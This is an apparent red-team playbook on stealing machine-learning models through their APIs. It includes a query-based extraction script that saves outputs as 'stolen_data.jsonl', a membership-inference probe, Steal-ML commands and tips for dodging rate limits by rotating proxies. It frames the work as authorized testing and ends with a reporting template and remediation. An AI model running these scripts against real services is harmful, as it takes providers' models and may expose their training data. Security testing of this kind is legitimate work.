# Field Manual Playbook 07: Model Theft & Extraction

![ ](../assets/page_header_half_height.png)

**Attack Type**: Model Stealing / Extraction  
**Difficulty**: ⭐⭐⭐ Advanced  
**OWASP LLM**: #10 | **MITRE ATLAS**: T0809

---

## When to Use

✅ Extract proprietary model  
✅ Clone model behavior  
✅ Test model protection  
✅ Membership inference

**Goal**: Steal or extract the target model.

---

### Step 1: Baseline Testing (Manual Probing)

**Goal**: Confirm the API returns high-fidelity outputs suitable for extraction.

```bash
# Test API response structure
curl $API -d '{"prompt": "Classify sentiment: This is great"}'
# Ideal response: {"label": "positive", "confidence": 0.998}
# Hard to steal: {"label": "positive"} (No confidence/logits)
```

---

### Step 2: Query-Based Model Extraction

**Goal**: Train a copy of the target model by querying it with diverse inputs.

#### 1. Extraction Script (`extract_model.py`)

```python
import requests
import json
import time

API_URL = "http://target-api.com/v1/predict"
VOCAB = ["good", "bad", "service", "product", "price", "fast", "slow"]

queries = [f"This {w1} is {w2}" for w1 in VOCAB for w2 in VOCAB]
dataset = []

print(f"[*] Starting extraction with {len(queries)} queries...")

for q in queries:
    try:
        # 1. Query Target
        resp = requests.post(API_URL, json={"text": q}).json()
        label = resp.get('label')
        conf = resp.get('confidence', 1.0)

        # 2. Save Pair
        dataset.append({"input": q, "output": label, "conf": conf})
        print(f"Extracted: {q} -> {label}")

    except Exception as e:
        print(f"Error: {e}")

    time.sleep(0.1) # Rate limiting avoidance

# 3. Save Dataset
with open("stolen_data.jsonl", "w") as f:
    for entry in dataset:
        f.write(json.dumps(entry) + "\n")

print("[+] Extraction complete. Train your local model on 'stolen_data.jsonl'.")
```

#### 2. Training the Surrogate

Once you have `stolen_data.jsonl`:

```bash
# Example: Fine-tune a local DistilBERT on stolen data
python train_surrogate.py --data stolen_data.jsonl --epochs 3
```

---

### Step 3: Membership Inference Attack (MIA)

**Goal**: Determine if a specific sentence was in the target's training data.

#### 1. Perplexity Test

High confidence + Low perplexity usually indicates training data membership.

```python
def check_membership(api_url, text):
    """Simple MIA Probe"""
    # 1. Get prediction confidence
    resp = requests.post(api_url, json={"text": text}).json()
    confidence = resp.get('confidence', 0)

    # 2. Check if confidence is suspiciously high (overfit)
    if confidence > 0.9999:
        return True, f"Likely Member (Conf: {confidence})"
    return False, f"Non-Member (Conf: {confidence})"

payload = "The secret passphrase is: BlueMonkey123"
is_member, msg = check_membership(API_URL, payload)
print(msg)
```

---

### Step 4: Automated Tools

Use `Steal-ML` for larger functional extraction.

```bash
# Clone
git clone https://github.com/ftramer/Steal-ML
cd Steal-ML

# Run Extraction (Black Box)
python extract.py \
  --url $TARGET_API \
  --budget 10000 \
  --output stolen_model.pkl
```

---

## Troubleshooting

| Issue                    | Solution                                                                                                          |
| :----------------------- | :---------------------------------------------------------------------------------------------------------------- |
| **API Rate Limits**      | Add `time.sleep(1)` to your script loop. Rotate proxies.                                                          |
| **Low Agreement**        | The local surrogate model architecture differs too much. Try a larger base model (e.g., RoBERTa instead of Bert). |
| **No Confidence Scores** | Use "Hard Label" extraction techniques (requires 10-100x more queries).                                           |

---

## Reporting Template

```markdown
## Finding: Model Extraction Vulnerability

**Severity**: HIGH
**Description**: The API returns high-precision confidence scores, allowing model theft via query probing.
**Method**: Successfully reconstructed 90% accuracy surrogate model with 500 queries.
**Impact**: Intellectual property theft, competitive replication.
**Remediation**: Remove confidence scores from API output; implement aggressive rate limiting and anomaly detection.
```

**Legal**: Model inference attacks may violate TOS/CFAA. Authorized testing only.
**Reference**: [Handbook Chapter 20](../Chapter_20_Model_Theft_and_Membership_Inference.md)
